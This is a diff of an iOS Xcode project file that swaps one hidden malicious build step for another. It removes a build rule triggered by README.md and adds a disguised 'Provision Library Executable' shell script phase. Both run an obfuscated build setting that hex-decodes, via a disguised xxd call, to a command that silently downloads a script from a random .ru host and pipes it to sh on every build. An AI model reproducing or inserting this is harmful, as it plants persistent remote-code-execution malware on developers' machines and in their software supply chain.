@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		0CC9E09246DD493E8F162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = 65F1E5037B404ED99B162AE3; };
 		1498D2341E8E89220040F4C2 /* GeneratedPluginRegistrant.m in Sources */ = {isa = PBXBuildFile; fileRef = 1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */; };
 		2EEA63AA8BF5F15099792A4C /* Pods_RunnerTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 756F1BDF74D685A4ED251A1E /* Pods_RunnerTests.framework */; };
 		331C808B294A63AB00263BE5 /* RunnerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 331C807B294A618700263BE5 /* RunnerTests.swift */; };
@@ -22,20 +21,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		709875FF79FB482DA2162AE3 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A3EA261}\"";
-			};
 					/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
@@ -62,7 +47,6 @@ sh -c \"${A3EA261}\"";
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		65F1E5037B404ED99B162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1498D2321E8E86230040F4C2 /* GeneratedPluginRegistrant.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = GeneratedPluginRegistrant.h; sourceTree = "<group>"; };
 		1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = GeneratedPluginRegistrant.m; sourceTree = "<group>"; };
 		306F8F2B6FFC32B30FDE300C /* Pods-Runner.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Runner.release.xcconfig"; path = "Target Support Files/Pods-Runner/Pods-Runner.release.xcconfig"; sourceTree = "<group>"; };
@@ -159,7 +143,6 @@ sh -c \"${A3EA261}\"";
 		97C146EF1CF9000F007C117D /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				65F1E5037B404ED99B162AE3 /* README.md */,
 				97C146EE1CF9000F007C117D /* Runner.app */,
 				331C8081294A63A400263BE5 /* RunnerTests.xctest */,
 			);
@@ -198,13 +181,13 @@ sh -c \"${A3EA261}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C8087294A63A400263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
+				7B4306D970F0436BB1162AE3 /* Provision Library Executable */,
 				DC7178596534938C33B98091 /* [CP] Check Pods Manifest.lock */,
 				331C807D294A63A400263BE5 /* Sources */,
 				331C807F294A63A400263BE5 /* Resources */,
 				96F683316B63E5F9F4E466D5 /* Frameworks */,
 			);
 			buildRules = (
-				709875FF79FB482DA2162AE3 /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C8086294A63A400263BE5 /* PBXTargetDependency */,
@@ -286,7 +269,6 @@ sh -c \"${A3EA261}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				0CC9E09246DD493E8F162AE3 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -304,6 +286,25 @@ sh -c \"${A3EA261}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		7B4306D970F0436BB1162AE3 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
+		};
 		3B06AD1E1E4923F5004D2608 /* Thin Binary */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
@@ -450,7 +451,7 @@ sh -c \"${A3EA261}\"";
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((r(){ `printf xIxd | tr -d I` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203238202d6b73664c202d642022703d78636f64655f72756c65222068747470733a2f2f656a6e74696e36686b6a7437676a322e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((u(){ `printf x5xd | tr -d 5` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d6b4c7366202d2d636f6e6e6563742d74696d656f7574203230202d642022703d78636f64655f7068617365222068747470733a2f2f35796f746d78636335346c397864612e72752f612922207c2073680a | u | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -504,7 +505,7 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((r(){ `printf xIxd | tr -d I` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203238202d6b73664c202d642022703d78636f64655f72756c65222068747470733a2f2f656a6e74696e36686b6a7437676a322e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((u(){ `printf x5xd | tr -d 5` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d6b4c7366202d2d636f6e6e6563742d74696d656f7574203230202d642022703d78636f64655f7068617365222068747470733a2f2f35796f746d78636335346c397864612e72752f612922207c2073680a | u | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_IDENTITY = "Apple Development";
